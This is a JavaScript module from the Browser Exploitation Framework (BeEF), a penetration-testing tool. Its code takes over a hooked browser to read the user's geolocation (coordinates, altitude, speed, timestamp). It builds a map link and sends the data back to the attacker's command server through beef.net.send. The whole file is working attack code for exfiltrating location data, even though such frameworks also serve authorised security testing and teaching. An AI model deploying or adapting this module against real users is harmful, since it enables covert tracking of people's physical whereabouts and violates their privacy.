//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// geo locate
//
beef.execute(function() {
    var onSuccess = function(position) {
        result = 
          'Latitude: '          + position.coords.latitude          + '\n' +
          'Longitude: '         + position.coords.longitude         + '\n' +
          'Altitude: '          + position.coords.altitude          + '\n' +
          'Accuracy: '          + position.coords.accuracy          + '\n' +
          'Altitude Accuracy: ' + position.coords.altitudeAccuracy  + '\n' +
          'Heading: '           + position.coords.heading           + '\n' +
          'Speed: '             + position.coords.speed             + '\n' +
          'Timestamp: '         + new Date(position.timestamp)      + '\n' ;
 
       map = 'Map url: http://maps.google.com/?ll='+ 
            position.coords.latitude + ',' + position.coords.longitude;

        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result+map );
    };

    // onError Callback receives a PositionError object
    //
    function onError(error) {
        beef.debug('code: '    + error.code    + '\n' +
          'message: ' + error.message + '\n');
    }

    navigator.geolocation.getCurrentPosition(onSuccess, onError);
});
